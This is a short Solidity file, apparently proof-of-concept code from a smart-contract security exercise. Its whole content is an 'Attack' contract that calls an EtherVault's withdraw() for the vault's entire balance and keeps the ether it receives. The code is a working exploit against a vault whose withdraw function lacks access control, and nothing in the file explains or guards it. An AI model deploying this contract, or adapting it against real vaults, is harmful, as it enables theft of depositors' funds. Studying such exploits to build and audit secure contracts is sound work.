// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEtherVault {
    function withdraw(uint256 _amount) external;

    function getEtherBalance() external view returns (uint256);
}

contract Attack {
    IEtherVault public immutable etherValut;

    constructor(IEtherVault _etherValut) {
        etherValut = _etherValut;
    }

    receive() external payable {}

    function attack() external {
        etherValut.withdraw(etherValut.getEtherBalance());
    }

    function getEtherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
